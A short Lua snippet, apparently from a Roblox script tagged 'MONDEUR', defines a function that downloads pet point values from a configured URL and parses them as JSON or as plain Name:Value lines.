-- POINT SYSTEM LOADER (LIVE DATA)
--------------------------------------------------------------
local function loadPoints()
    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if not success or not content then 
        warn("[MONDEUR] Error reaching Point System URL.")
        return 
    end

    -- Attempt JSON Parsing
    local jsonSuccess, decoded = pcall(function() return HttpService:JSONDecode(content) end)
    if jsonSuccess and type(decoded) == "table" then
        PetValues = decoded
        print("[MONDEUR] Point System Synced (JSON)")
    else
        -- Fallback: Manual Text Parsing (Name:Value or Name=Value)
        print("[MONDEUR] JSON parsing failed. Switching to manual list parsing...")
        for line in content:gmatch("[^\r\n]+") do
            local name, val = line:match("([^:=]+)[:=]([%d%.]+)")
            if name and val then
                PetValues[trim(name)] = tonumber(val)
            end
        end
        print("[MONDEUR] Point System Synced (Raw Text)")
    end
end

